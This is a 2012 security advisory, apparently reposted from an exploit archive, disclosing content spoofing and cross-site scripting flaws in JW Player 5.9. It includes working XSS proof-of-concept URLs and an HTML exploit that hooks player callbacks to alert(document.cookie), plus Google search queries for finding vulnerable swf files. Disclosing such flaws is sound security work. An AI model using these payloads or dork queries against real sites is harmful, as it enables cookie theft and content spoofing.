@@ -1,0 +1,180 @@
+id: 18495
+date: 06/07/2012
+title: JW Player 5.9 Cross Site Scripting / Content Spoofing
+author: MustLive
+cves: 
+
+Hello list!
+
+I want to warn you about security vulnerabilities in JW Player.
+
+These are Content Spoofing and Cross-Site Scripting vulnerabilities.
+
+-------------------------
+Affected products:
+-------------------------
+
+Vulnerable are JW Player 5.9.2156 (and 5.9.2206, except one vulnerability) 
+and previous versions. Tested in 5.7.1896, 5.9.2156 and 5.9.2206. Only some 
+of these vulnerabilities exist in 3.x and previous versions.
+
+In version 5.9.2206 developers have fixed first XSS hole from 
+bellow-mentioned.
+
+----------
+Details:
+----------
+
+Content Spoofing (WASC-12):
+
+In parameter file there can be set as video, as audio files.
+
+Swf-file of JW Player accepts arbitrary addresses in parameters file and 
+image, which allows to spoof content of flash - i.e. by setting addresses of 
+video (audio) and/or image files from other site.
+
+http://http://site/jwplayer.swf?file=1.flv&backcolor=0xFFFFFF&screencolor=0xFFFFFF
+http://http://site/jwplayer.swf?file=1.flv&image=1.jpg
+
+Swf-file of JW Player accepts arbitrary addresses in parameter config, which 
+allows to spoof content of flash - i.e. by setting address of config file 
+from other site (parameters file and image in xml-file accept arbitrary 
+addresses). For loading of config file from other site it needs to have 
+crossdomain.xml.
+
+http://http://site/jwplayer.swf?config=1.xml
+
+1.xml
+
+<config>
+  <file>1.flv</file>
+  <image>1.jpg</image>
+</config>
+
+Swf-file of JW Player accepts arbitrary addresses in parameter playlistfile, 
+which allows to spoof content of flash - i.e. by setting address of playlist 
+file from other site (parameters media:content and media:thumbnail in 
+xml-file accept arbitrary addresses). For loading of playlist file from 
+other site it needs to have crossdomain.xml.
+
+http://http://site/jwplayer.swf?playlistfile=1.rss
+http://http://site/jwplayer.swf?playlistfile=1.rss&playlist.position=right&playlist.size=200
+
+1.rss
+
+<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>Example playlist</title>
+    <item>
+      <title>Video #1</title>
+      <description>First video.</description>
+      <media:content url="1.flv" duration="5" />
+      <media:thumbnail url="1.jpg" />
+    </item>
+    <item>
+      <title>Video #2</title>
+      <description>Second video.</description>
+      <media:content url="2.flv" duration="5" />
+      <media:thumbnail url="2.jpg" />
+    </item>
+  </channel>
+</rss>
+
+XSS (WASC-08):
+
+http://http://site/jwplayer.swf?playerready=alert(document.cookie)
+
+XSS (WASC-08):
+
+If at the site at page with jwplayer.swf (player.swf) there is possibility 
+(via HTML Injection) to include JS code with callback-function, and there 
+are 19 such functions in total, then it's possible to conduct XSS attack. 
+I.e. JS-callbacks can be used for XSS attack.
+
+Example of exploit:
+
+<script type="text/javascript" src="jwplayer.js"></script>
+<div id="container">...</div>
+<script type="text/javascript">
+jwplayer("container").setup({
+flashplayer: "jwplayer.swf",
+file: "1.flv",
+autostart: true,
+height: 300,
+width: 480,
+events: {
+onReady: function() { alert(document.cookie); },
+onComplete: function() { alert(document.cookie); },
+onBufferChange: function() { alert(document.cookie); },
+onBufferFull: function() { alert(document.cookie); },
+onError: function() { alert(document.cookie); },
+onFullscreen: function() { alert(document.cookie); },
+onMeta: function() { alert(document.cookie); },
+onMute: function() { alert(document.cookie); },
+onPlaylist: function() { alert(document.cookie); },
+onPlaylistItem: function() { alert(document.cookie); },
+onResize: function() { alert(document.cookie); },
+onBeforePlay: function() { alert(document.cookie); },
+onPlay: function() { alert(document.cookie); },
+onPause: function() { alert(document.cookie); },
+onBuffer: function() { alert(document.cookie); },
+onSeek: function() { alert(document.cookie); },
+onIdle: function() { alert(document.cookie); },
+onTime: function() { alert(document.cookie); },
+onVolume: function() { alert(document.cookie); }
+}
+});
+</script>
+
+There is such feature as logo in licensed version of the player. So in 
+licensed versions of swf-file there are also the next vulnerabilities:
+
+Content Spoofing (WASC-12):
+
+http://http://site/jwplayer.swf?file=1.flv&logo.file=1.jpg&logo.link=http://websecurity.com.ua
+
+XSS (WASC-08):
+
+http://http://site/jwplayer.swf?file=1.flv&logo.file=1.jpg&logo.link=javascript:alert(document.cookie)
+
+Widespread of vulnerabilities.
+
+Swf-files of JW Player can have different names, such as jwplayer.swf and 
+player.swf.
+
+http://www.google.com.ua/search?q=inurl%3Ajwplayer.swf+filetype%3Aswf
+http://www.google.com.ua/search?q=inurl%3Aplayer.swf+filetype%3Aswf
+
+By Google's information, there are 99600 + 7610000 = 7709600 (in May) of 
+such flash files in Internet. This is approximate data and not all of the 
+player.swf are swf-files of JW Player, but taking into account that this is 
+very popular flash application, which is used as standalone, as a part of 
+different web applications (CMS), and Google could indexed only 10% of its 
+swf-files, then we receive tens millions of vulnerable swf-files of JW 
+Player in Internet.
+
+------------
+Timeline:
+------------ 
+
+2012.05.25 - found vulnerabilities during pentest (in version 5.7.1896 and 
+tested in the last version from official site). Some of CS vulnerabilities 
+had existed in 3.x version of the player and I knew about them since 2008, 
+when first time saw JW Player.
+2012.05.28 - announced at my site.
+2012.05.29 - informed developers.
+2012.05.29 - developers answered that most holes should be fixed in version 
+5.9.2206 (in trunk).
+2012.05.31 - after checking, I've informed developers that in trunk only one 
+XSS are fixed. Then they answered that they were planning to fix all other 
+vulnerabilities in upcoming 6.0 version of the player.
+2012.06.06 - disclosed at my site (http://websecurity.com.ua/5848/).
+
+Best wishes & regards,
+MustLive
+Administrator of Websecurity web site
+http://websecurity.com.ua 
+
+
+
+#  0day.today [2023-03-26]  #
